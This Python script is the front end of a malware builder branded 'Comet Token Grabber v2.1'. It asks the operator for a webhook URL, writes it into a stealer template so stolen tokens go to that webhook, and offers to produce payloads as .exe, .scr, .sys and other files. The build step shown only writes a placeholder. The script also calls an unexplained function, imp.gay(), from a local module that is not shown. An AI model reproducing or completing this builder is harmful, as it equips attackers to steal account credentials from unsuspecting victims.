import os
import sys
import time
from colorama import Fore, init
from pystyle import Colors, Colorate, Center, Write, Anime
import math
import random
import string
import datetime
import platform
import socket
import getpass
import shutil
import tempfile
import subprocess
import pathlib
from utills import imp
import threading
import re
import json
import base64
import hashlib
import uuid
import ctypes
import win32api
import win32con
import os
import sys
import time
import colorama
import pystyle
import subprocess
from pystyle import *
from subprocess import call
from colorama import *
from colorama import Fore
init(autoreset=True)

def clear():
    os.system("cls" if os.name == "nt" else "clear")

# 🔥 Sexy animated intro
intro = """
░█████╗░░█████╗░███╗░░░███╗███████╗████████╗
██╔══██╗██╔══██╗████╗░████║██╔════╝╚══██╔══╝
██║░░╚═╝██║░░██║██╔████╔██║█████╗░░░░░██║░░░
██║░░██╗██║░░██║██║╚██╔╝██║██╔══╝░░░░░██║░░░
╚█████╔╝╚█████╔╝██║░╚═╝░██║███████╗░░░██║░░░
░╚════╝░░╚════╝░╚═╝░░░░░╚═╝╚══════╝░░░╚═╝░░░

         Press [Enter] to continue
"""

# 🔰 Fancy logo centered
def logo():
    logo_text = """
░█████╗░░█████╗░███╗░░░███╗███████╗████████╗
██╔══██╗██╔══██╗████╗░████║██╔════╝╚══██╔══╝
██║░░╚═╝██║░░██║██╔████╔██║█████╗░░░░░██║░░░
██║░░██╗██║░░██║██║╚██╔╝██║██╔══╝░░░░░██║░░░
╚█████╔╝╚█████╔╝██║░╚═╝░██║███████╗░░░██║░░░
░╚════╝░░╚════╝░╚═╝░░░░░╚═╝╚══════╝░░░╚═╝░░░

╔══════════════════════════════════════════════════╗
║         🔥 Comet Token Grabber v2.1 🔥          ║
║    Build powerful payloads with full control     ║
╚══════════════════════════════════════════════════╝
"""
    print(Colorate.Vertical(Colors.blue_to_purple, Center.XCenter(logo_text)))

# 🧠 Replace webhook in template
def write_settings(webhook: str):
    try:
        with open("comet.py", "r", encoding="utf-8") as file:
            data = file.read()
        data = data.replace("%WEBHOOK%", webhook)
        with open("Comet.py", "w", encoding="utf-8") as out_file:
            out_file.write(data)
    except Exception as e:
        print(Center.XCenter(Fore.RED + f"[!] Error writing settings: {e}"))

# 🧪 Build the payload
def build_file(extension: str):
    clear()
    logo()
    imp.gay()
    webhook = input(Center.XCenter(Fore.CYAN + "Enter Webhook: "))
    write_settings(webhook)
    print()
    Write.Print(Center.XCenter("Building your file...\n"), Colors.red_to_purple, 0.05)
    time.sleep(1.5)
    file_name = f"output{extension}"
    with open(file_name, "w") as f:
        f.write("# payload goes here")
    print(Center.XCenter(Fore.GREEN + f"[✓] Successfully built: {file_name}"))
    print()
    input(Center.XCenter(Fore.YELLOW + "Press Enter to return to the menu..."))

# 🧭 Main menu with centered text
def main_menu():
    clear()
    logo()
    Write.Print(Center.XCenter("""
[1] Build .exe
[2] Build .ink
[3] Build .scr
[4] Build .py
[5] Build .ini
[6] Build .sys
[0] Exit
"""), Colors.purple_to_blue, 0.01)

    choice = input(Colorate.Horizontal(Colors.blue_to_purple, "                                Your Selection: "))


    match choice:
        case "1": build_file(".exe")
        case "2": build_file(".ink")
        case "3": build_file(".scr")
        case "4": build_file(".py")
        case "5": build_file(".ini")
        case "6": build_file(".sys")
        case "0": sys.exit(Center.XCenter(Fore.LIGHTRED_EX + "Exiting... Stay Comet 💫"))
        case _:
            print(Center.XCenter(Fore.RED + "[!] Invalid choice."))
            time.sleep(1.5)

# 💥 Launch
if __name__ == "__main__":
    clear()
    Anime.Fade(Center.Center(intro), Colors.blue_to_purple, Colorate.Vertical, interval=0.035, enter=True)
    while True:
        imp.gay()
        main_menu()


